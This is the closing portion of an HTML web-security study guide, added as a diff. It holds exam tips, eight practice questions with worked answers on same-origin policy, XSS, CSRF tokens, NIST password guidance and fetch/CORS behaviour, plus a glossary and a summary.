+    <li><b>Security</b>: <b>how</b> the data is stored, transmitted and access-controlled.</li>
+    <li><b>Direct leak</b>: the actual value escapes (password leak, database dump).</li>
+    <li><b>Indirect leak</b>: the value stays hidden but is <b>inferred</b> &ndash; recommendations
+        based on behaviour, "people you may know", differing error messages, response timing.</li>
+  </ul>
+</div>
+
+<h2>9.4 Exam technique: the keyword radar</h2>
+
+<table>
+  <tr><th style="width:158px">What you spot</th><th style="width:106px">What it usually means</th><th>Where it happened here</th></tr>
+  <tr><td><b>opposite pairs</b></td><td>exactly one is right</td>
+      <td>Q7 A vs B (server vs client), Q10 A vs B (different vs same origin).</td></tr>
+  <tr><td><b>a reversed victim</b></td><td>likely FALSE</td>
+      <td>Q1 option A: the attack supposedly blocks <i>hackers</i> rather than users.</td></tr>
+  <tr><td><b>the wrong defence</b></td><td>likely FALSE</td>
+      <td>Q5 option C: a CSRF token offered as an XSS fix. Always match defence to attack.</td></tr>
+  <tr><td><b>an impossible claim</b></td><td>almost certainly the answer</td>
+      <td>Q2 option D: "a complex password can be easily decrypted" &ndash; passwords are hashed.</td></tr>
+  <tr><td><b>All of the above</b></td><td>check every option</td>
+      <td>A trap in Q1, Q2, Q4 and Q5 &ndash; but the <b>correct answer</b> in Q3 and Q8.</td></tr>
+  <tr><td><b>"can be used to"</b></td><td>a weak claim, often TRUE</td>
+      <td>Q3 option B. Compare with "completely prevents", which would be false.</td></tr>
+  <tr><td><b>false</b> in the stem</td><td>tick the wrong statement</td>
+      <td>Q4. Note that "All of the above" then means "all are false".</td></tr>
+</table>
+
+<h2>9.5 Practice questions</h2>
+
+<p>Cover the answers. If you can do these eight, you have genuinely learned this week.</p>
+
+<div class="card">
+  <p><b>P1.</b> Are <code>https://shop.example.com</code> and <code>https://example.com</code>
+  the same origin? What about <code>https://shop.example.com/cart</code> and
+  <code>https://shop.example.com/pay?id=2</code>?</p>
+
+  <p><b>P2.</b> An attacker successfully performs XSS on your site. Explain why your CSRF token
+  no longer protects you.</p>
+
+  <p><b>P3.</b> Your site forces users to change passwords every 30 days and requires a symbol.
+  Which two NIST 800-63B recommendations are you going against, and what should you do instead?</p>
+
+  <p><b>P4.</b> You run <code>fetch('/api/users')</code> with no options. What HTTP method is
+  used, what mode, and will your session cookie be sent?</p>
+
+  <p><b>P5.</b> Why does a CSRF token have to be generated by the server rather than the client?</p>
+
+  <p><b>P6.</b> A login form replies "no account with that email" for unknown emails and
+  "incorrect password" for known ones. What kind of leak is this, and how would you fix it?</p>
+
+  <p><b>P7.</b> You fetch a cross-origin image with <code>mode: 'no-cors'</code>. What can your
+  JavaScript read from the response, and which methods could you have used?</p>
+
+  <p><b>P8.</b> A company encrypts all user data at rest, uses HTTPS everywhere, and then sells
+  aggregated user location histories to advertisers. Is this a security failure, a privacy
+  failure, or both?</p>
+</div>
+
+<div class="ans">
+  <span class="boxtitle">Answers to the practice questions</span>
+  <p><b>P1.</b> <b>Not the same origin</b> &ndash; <code>shop.example.com</code> and
+  <code>example.com</code> are different <b>hosts</b>. The second pair <b>are</b> the same
+  origin: identical scheme, host and port, and paths and query strings are ignored.</p>
+
+  <p><b>P2.</b> Because the attacker's script is now running <b>inside your page, on your
+  origin</b>. It can simply <b>read the CSRF token</b> out of the DOM (or fetch a fresh page and
+  parse it) and include it in a forged request. The same-origin policy no longer helps, since the
+  script <i>is</i> same-origin. This is why <b>XSS is considered the more severe bug</b>: it
+  defeats CSRF protection.</p>
+
+  <p><b>P3.</b> You are going against (1) <b>do not force periodic resets</b> &ndash; users respond
+  with predictable edits like <code>Pass1</code> to <code>Pass2</code>; and (2) <b>do not impose
+  composition rules</b> such as mandatory symbols. Instead: allow long passphrases up to 64
+  characters, check against <b>breached password lists</b>, throttle failed logins, and reset
+  only on evidence of compromise.</p>
+
+  <p><b>P4.</b> Method <b>GET</b>, mode <b>cors</b>, and <b>yes</b> the cookie is sent &ndash;
+  because <code>/api/users</code> is a <b>relative, same-origin</b> URL and the default
+  <code>credentials</code> value is <code>same-origin</code>. (It would <i>not</i> be sent to a
+  different origin unless you set <code>credentials: 'include'</code>.)</p>
+
+  <p><b>P5.</b> Because the <b>attacker is also a client</b>. If clients generated their own
+  tokens, the attacker would generate a valid-looking one and the defence would be worthless. The
+  token works only because the <b>server</b> creates it, remembers it against your session, and
+  can therefore verify that the request came from a page <i>it</i> served.</p>
+
+  <p><b>P6.</b> An <b>indirect leak</b> &ndash; the different messages reveal <b>which email
+  addresses are registered</b>, without ever leaking a password. It enables account enumeration.
+  Fix: return a <b>single identical message</b> ("invalid email or password") for both cases, and
+  keep the response time similar so timing does not leak the answer either.</p>
+
+  <p><b>P7.</b> You can read <b>essentially nothing</b>: the response is <b>opaque</b>, with status
+  0, a null body and empty headers. You can tell the request completed and you can display the
+  image, but you cannot inspect it. Only <b>GET, HEAD and POST</b> were available in that mode.</p>
+
+  <p><b>P8.</b> A <b>privacy failure</b>, not a security failure. The security mechanisms are
+  working correctly &ndash; the data is protected from outsiders. The problem is what the company
+  itself <b>chooses to do</b> with data users did not expect to be sold. This is exactly why the
+  two words are not interchangeable.</p>
+</div>
+
+<h2>9.6 Glossary</h2>
+
+<table class="flow">
+  <tr><th style="width:172px">Term</th><th>Meaning in one sentence</th></tr>
+  <tr><td><b>DoS</b></td><td>An attack that makes a service unavailable to its legitimate users.</td></tr>
+  <tr><td><b>DDoS</b></td><td>A DoS attack launched from many machines at once.</td></tr>
+  <tr><td><b>Botnet</b></td><td>A network of compromised machines an attacker controls.</td></tr>
+  <tr><td><b>Availability</b></td><td>Whether a service is usable when users need it.</td></tr>
+  <tr><td><b>Rate limiting</b></td><td>Capping how many requests one source may make.</td></tr>
+  <tr><td><b>NIST SP 800-63B</b></td><td>The modern reference for password and authentication rules.</td></tr>
+  <tr><td><b>Hashing</b></td><td>A one-way transformation; it cannot be reversed.</td></tr>
+  <tr><td><b>Salt</b></td><td>A unique random value added per user before hashing.</td></tr>
+  <tr><td><b>Brute force</b></td><td>Trying huge numbers of password guesses.</td></tr>
+  <tr><td><b>Credential stuffing</b></td><td>Reusing passwords leaked from other sites.</td></tr>
+  <tr><td><b>Origin</b></td><td>The triple of scheme, host and port.</td></tr>
+  <tr><td><b>Same-origin policy</b></td><td>The rule that a page may not read another origin's data.</td></tr>
+  <tr><td><b>CORS</b></td><td>Cross-Origin Resource Sharing: how a server permits specific origins.</td></tr>
+  <tr><td><b>Preflight</b></td><td>An automatic OPTIONS request asking permission before the real one.</td></tr>
+  <tr><td><b>Simple request</b></td><td>A basic cross-origin request that needs no preflight.</td></tr>
+  <tr><td><b>Opaque response</b></td><td>A no-cors response you cannot read: status 0, null body.</td></tr>
+  <tr><td><b>credentials</b></td><td>The fetch option deciding whether cookies are sent.</td></tr>
+  <tr><td><b>XSS</b></td><td>Injecting malicious client-side scripts into someone else's page.</td></tr>
+  <tr><td><b>Escaping</b></td><td>Converting characters so they display as text, not run as code.</td></tr>
+  <tr><td><b>Validation</b></td><td>Checking input has the expected shape before accepting it.</td></tr>
+  <tr><td><b>CSP</b></td><td>Content Security Policy: tells the browser which scripts may run.</td></tr>
+  <tr><td><b>HttpOnly</b></td><td>A cookie flag preventing JavaScript from reading the cookie.</td></tr>
+  <tr><td><b>CSRF</b></td><td>Making a logged-in user's browser send a request they did not intend.</td></tr>
+  <tr><td><b>CSRF token</b></td><td>A server-generated secret proving a request came from the real page.</td></tr>
+  <tr><td><b>SameSite</b></td><td>A cookie flag limiting when cookies are sent cross-site.</td></tr>
+  <tr><td><b>Privacy</b></td><td>Which personal data is collected and shared, and with consent.</td></tr>
+  <tr><td><b>Security</b></td><td>How data is stored, transmitted and protected.</td></tr>
+  <tr><td><b>PII</b></td><td>Personally identifiable information.</td></tr>
+  <tr><td><b>Direct leak</b></td><td>The actual sensitive value escapes.</td></tr>
+  <tr><td><b>Indirect leak</b></td><td>The value stays hidden but is inferred from behaviour.</td></tr>
+</table>
+
+<h2>9.7 Final word</h2>
+
+<div class="kid">
+  <span class="boxtitle">If you remember only seven sentences from this whole book</span>
+  <ol style="margin-bottom:0">
+    <li><b>DoS</b> attacks <b>availability</b> &ndash; it locks out real users, it does not steal.</li>
+    <li>NIST says <b>length beats complexity</b>, salt with at least <b>32 bits</b>, throttle
+        logins, and <b>do not</b> force periodic resets.</li>
+    <li><b>Origin = scheme + host + port.</b> Subdomains differ; paths do not matter.</li>
+    <li>Cross-origin reads are <b>denied by default</b>; CORS is how a server names the origins and
+        methods it accepts.</li>
+    <li><code>fetch</code> defaults: <b>GET</b>, <b>cors</b>, <b>same-origin</b> credentials.
+        <code>no-cors</code> gives an <b>opaque</b> response limited to GET, HEAD and POST.</li>
+    <li><b>XSS</b> abuses the user's trust in the site (fix: escape and validate).
+        <b>CSRF</b> abuses the site's trust in the user (fix: a server-generated token).</li>
+    <li><b>Privacy</b> is which data you share; <b>security</b> is how it is protected. And data can
+        leak <b>indirectly</b>, by inference.</li>
+  </ol>
+</div>
+
+<p style="margin-top:22px;text-align:center;color:#5a6472;font-size:9.5pt">
+  <i>Prepared as a step-by-step teaching solution.<br/>
+  Work through the figures with a pencil in hand; that is where the learning actually happens.</i>
+</p>
+
+<div class="card">
+  <span class="boxtitle" style="color:#5a6472">Notes on sources</span>
+  <small>
+  Technical facts were checked against
+  <a href="https://pages.nist.gov/800-63-3/sp800-63b.html">NIST Special Publication 800-63B</a>
+  for the password guidance (length as the primary strength factor, a minimum of 8 characters with
+  up to 64 permitted, salted hashing with a salt of at least 32 bits, throttling failed
+  authentication attempts, and the recommendation against arbitrary periodic password changes);
+  and against MDN for the web platform behaviour:
+  <a href="https://developer.mozilla.org/en-US/docs/Web/API/Request/mode">Request.mode</a> and
+  <a href="https://developer.mozilla.org/en-US/docs/Web/API/Response/type">Response.type</a>
+  for opaque responses (status 0, null body, empty headers),
+  <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">Using the Fetch API</a>
+  for the default method and options,
+  <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS">CORS</a> and
+  <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">the same-origin policy</a>,
+  and the <a href="https://owasp.org/www-community/attacks/csrf">OWASP</a> descriptions of XSS and
+  CSRF. All explanations, analogies and diagrams here were written and drawn for this document.
+  Content was rephrased for compliance with licensing restrictions.
+  </small>
+</div>
+
+</body>
+</html>
